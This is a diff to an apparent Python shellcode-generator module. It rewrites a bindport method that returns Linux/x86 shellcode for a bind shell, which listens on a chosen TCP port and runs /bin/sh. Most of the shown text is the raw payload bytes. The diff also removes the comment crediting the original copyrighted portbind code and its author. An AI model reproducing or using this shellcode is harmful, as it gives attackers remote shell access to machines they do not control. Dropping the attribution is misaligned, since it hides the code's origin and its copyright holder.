@@ -15,7 +15,6 @@ def bytecode(nasm_src):
     opcodes = bc(nasm_src, hdd=False, rembin=True, shctest=False)
     return opcodes
 
-
 class linux(object):
 
     def bindport(self, port):
@@ -25,16 +24,8 @@ class linux(object):
          * create bind-port shellcode
          * simple.
          *
-         * Based on:
-         *
-         * $Id: portbind-linux.c,v 1.4 2004/06/02 12:22:30 raptor Exp $
-         *
-         * portbind-linux.c - setuid/portbind shellcode for Linux/x86
-         * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
-         *
-         * Simple portbind shellcode that bind()'s a setuid(0) shell
-         * (based on bighawk's code).
-         *
+         * portbind shellcode for Linux/x86
+         * 
          * Tested on Linux.
          *
          */
@@ -43,17 +34,17 @@ class linux(object):
         port = struct.pack(">I", port)
         port = port[2:]
         
-        shellcode = "\x31\xc0\x31\xdb\xb0\x17\xcd\x80" \
-        +"\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80" \
-        +"\x89\xc7\x52\x66\x68" \
+        bind = "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a" \
+        +"\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68" \
         + port \
-        +"\x43\x66\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80" \
-        +"\xb0\x66\xb3\x04\xcd\x80" \
-        +"\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80" \
-        +"\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80" \
-        +"\x41\xe2\xf8\x51\x68n/sh\x68//bi\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80"
+        +"\x6a\x10\x51\x50\xb0\x66\x89\xe1" \
+        +"\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd" \
+        +"\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f" \
+        +"\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f" \
+        +"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3" \
+        +"\x41\xcd\x80\x90";
 
-        return shellcode
+        return bind
 
 
     def reverse_tcp(self, locip, locport):
